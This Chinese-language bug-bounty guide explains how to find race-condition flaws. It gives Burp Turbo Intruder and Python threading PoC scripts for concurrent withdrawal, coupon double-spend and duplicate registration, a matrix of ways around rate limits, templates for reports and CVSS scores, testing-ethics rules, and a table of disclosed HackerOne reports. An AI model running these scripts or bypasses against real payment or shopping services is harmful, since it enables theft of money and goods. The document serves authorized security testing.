# 竞态条件 (Race Conditions)

> 视角：黑盒，目标是利用并发让"check-then-act"失效

## 1. 一句话说清

竞态 = 程序假设"读 → 改 → 写"是原子的，但并发请求让它不是。
SRC 价值：优惠券 / 余额 / 限购双花 = P1（$500–$5k）；金融场景能放大。

---

## 2. 典型场景

| 场景 | 描述 |
|------|------|
| 余额超扣 | 100 元余额，并发提现 100，提了 N 次 |
| 优惠券双花 | 一码用一次的优惠券被并发使用 N 次 |
| 限购抢单 | 限购 1 件被并发买走 N 件 |
| 邀请奖励 | 邀请同一用户多次得多次奖励 |
| 验证码重用 | 一个 code 一次性被消耗，但并发用了多次 |
| 唯一约束被破坏 | 注册同名账号 / 同邮箱 |
| 状态机跳跃 | 同一订单同时"取消"和"发货" |
| 文件上传 | 上传 + 验证 + 存储不原子 |

---

## 3. 探测手法

### 3.1 工具

```
- Burp Suite Intruder：选择 attack type "Pitchfork"，配 "Send N requests in parallel"
- Burp Turbo Intruder（更精确并发）：
    requestEngine.queue(req, gate='race1')
    再 openGate('race1')
- HTTPie 并发：xargs -P 50
- 自写 Python：threading + requests
- Go：goroutine + http.Client
```

### 3.2 Burp Turbo Intruder 模板

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=30,
                            requestsPerConnection=100,
                            engine=Engine.BURP2)
    for i in range(50):
        engine.queue(target.req, gate='r1')
    engine.openGate('r1')

def handleResponse(req, interesting):
    table.add(req)
```

### 3.3 经典 PoC：余额提现

```python
import threading, requests

def withdraw():
    requests.post("https://target/api/withdraw",
                  json={"amount":100},
                  headers={"Authorization":"Bearer X"})

# 账号余额 100，并发 50 次提 100
threads = [threading.Thread(target=withdraw) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]

# 检查后端余额
r = requests.get("https://target/api/balance", ...)
print(r.json())  # 余额可能变成 -4900 / 多笔成功提现
```

### 3.4 经典 PoC：优惠券双花

```python
def use_coupon():
    requests.post("https://target/api/order/create",
                  json={"productId":"X","couponCode":"SAVE50"},
                  headers={"Authorization":"Bearer X"})

threads = [threading.Thread(target=use_coupon) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]

# 服务端：1 张券应该只能用 1 次，但并发可能造 5 个折扣订单
```

### 3.5 唯一约束破坏

```python
def register():
    requests.post("https://target/api/register",
                  json={"email":"hunter+race@test.com","username":"raceX","password":"x"})

threads = [threading.Thread(target=register) for _ in range(20)]
# 如果 schema 没有 unique 约束 + check-then-create，可能创建多账号
```

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| 单连接限速 | 多连接 / HTTP/2 多路复用 |
| 同 IP 限频 | 多 IP / 代理池 |
| Idempotency-Key | 试不带 / 试不同 key 但同业务 |
| 数据库唯一约束 | 大小写差异：`Hunter@x` vs `hunter@x` |
| Token 一次性 | 在 token 还没标记"已用"时并发请求 |

---

## 5. 利用提权 / 横向

```
余额超扣 → 实际提现真金白银
优惠券 / 礼品卡双花 → 多倍商品
限购抢购 → 黄牛
唯一约束破坏 → 注册 admin 同名账号
状态机跳跃 → 已取消订单仍发货
```

---

## 6. 真实案例

- Starbucks gift card race: 1000 美元余额变 6000
- HackerOne 上多个金融平台的 race report
- 国内某外卖平台优惠券双花

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. 攻击脚本（Python / Burp Turbo）
2. 攻击前后端账号状态截图（余额、优惠券计数）
3. 复现率：5–10 次攻击中至少 N 次成功
4. 影响估算

### 7.2 PoC 模板

```
# 攻击前
GET /api/balance → {"balance":"100.00"}

# 并发攻击（脚本见附件 attack.py）
$ python3 attack.py
sent 50 concurrent withdraw(100) requests

# 攻击后
GET /api/balance → {"balance":"-4500.00"}
GET /api/transactions → 5 笔成功的 withdraw 100，每笔状态 SUCCESS

# 复现
共 5 轮，每轮 50 并发，平均成功 4 笔/轮（双花概率 80%）
```

### 7.3 CVSS

```
余额超扣（金融）            = 7.5–9.1
优惠券双花                  = 6.5–7.5
限购绕过                    = 5.3–6.5
唯一约束破坏 → 提权          = 8.1
```

### 7.4 影响段

```
通过并发提现接口 /api/withdraw，攻击者可让账户余额变为负数（即"凭空提现"）。
50 并发请求中通常有 4–5 笔成功扣款，每笔 100 元，账户初始余额 100 元。
经济模型：1 元成本（初始余额）→ 4–5 倍提现。

测试时使用研究员自己的账号，并立即与平台风控团队沟通退还所有"超扣"金额。
```

---

## 8. 不要做的事

- **禁**：实际提现真金白银。在测试环境 / 沙箱 / 平台允许的 demo 账号操作。如果只能在生产，**主动联系平台**说明你将做并发测试，并约定退还机制。
- **禁**：用并发刷别人的优惠券 / 邀请奖励。
- **限**：并发数 50 内，不要 1000+（视为 DoS）。
- **限**：同一漏洞复现 5–10 次，不要刷上千次。
- **报告中**：详细附上每次实验的"前 / 中 / 后"数据，证明你停手了。

## H1 真实案例

_共 4 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取代表案例_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | 15250 usd | Shopify | [Ability to bypass partner email confirmation to take over any store given an employee email](https://hackerone.com/reports/300305) | I told Pete I would take a look at Spotify, hi Pete. Summary** It's possible to take over any store account through partners gi… |
| High | 3000 usd | Tools for Humanity | [Race Condition Enables Bypassing Verification Check](https://hackerone.com/reports/2110030) | Race Condition Enables Bypassing Verification Check |
| High | 4000 usd | Internet Bug Bounty | [Time-of-check to time-of-use vulnerability in the std::fs::remove_dir_all() function of the Rust …](https://hackerone.com/reports/1520931) | The implementation of `std::fs::remove_dir_all()` in the Rust standard library is vulnerable to a time-of-check to time-of-use … |
| High | — | curl | [TOCTOU Race Condition in HTTP/2 Connection Reuse Leads to Certificate Validation Bypass](https://hackerone.com/reports/3335085) | I've discovered a Time-of-Check to Time-of-Use (TOCTOU) vulnerability in how `libcurl` handles persistent HTTP/2 connections |

**命中本类的 weakness 分布：**

- Time-of-check Time-of-use (TOCTOU) Race Condition：3 条
- Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')：1 条
